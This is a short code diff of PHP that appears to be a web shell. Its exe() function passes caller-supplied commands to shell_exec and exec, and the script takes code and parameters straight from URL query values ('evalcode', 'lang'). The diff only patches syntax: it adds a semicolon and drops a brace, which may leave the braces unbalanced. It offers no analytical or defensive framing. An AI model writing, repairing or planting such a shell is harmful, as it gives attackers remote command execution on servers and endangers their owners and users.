@@ -9,7 +9,7 @@ function exe($s_c){
         $s_out = ob_get_contents();
         ob_end_clean();
     }
-    if(is_callable('shell_exec')){
+    if(is_callable('shell_exec'))
         $s_out = @shell_exec($s_c);
     
     if(is_callable('exec')) 
@@ -26,7 +26,7 @@ function exe($s_c){
 }
 
 echo "start";
-$s_lang = $_GET['lang']
+$s_lang = $_GET['lang'];
 $s_code = $_GET['evalcode'];
 $s_tmpdir = getcwd();
 $s_rand = md5(time().rand(0,100));
